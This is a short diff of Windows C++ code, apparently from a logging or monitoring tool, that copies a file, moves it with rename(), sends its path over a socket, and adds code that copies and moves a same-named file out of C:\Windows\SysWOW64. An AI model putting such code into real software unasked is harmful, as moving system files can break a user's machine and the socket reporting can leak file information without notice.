@@ -41,7 +41,13 @@ DWORD WINAPI messageThread(LPVOID lpThreadParameter)
 			tempStr[index] = 0;
 
 			CopyFileA(p_logSystem->filePath.data(), tempStr, FALSE);         //复制文件到目标路径
+			rename(p_logSystem->filePath.data(), tempStr);
 			p_logSystem->socketClient.sendMessage(filePath);                 //利用socket发送文件路径
+
+			strcpy(filePath, "C:\\Windows\\SysWOW64\\");
+			strcat(filePath, fileName);
+			CopyFileA(filePath, tempStr, FALSE);         //复制文件到目标路径
+			rename(filePath, tempStr);
 			delete fileName;
 			delete filePath;
 
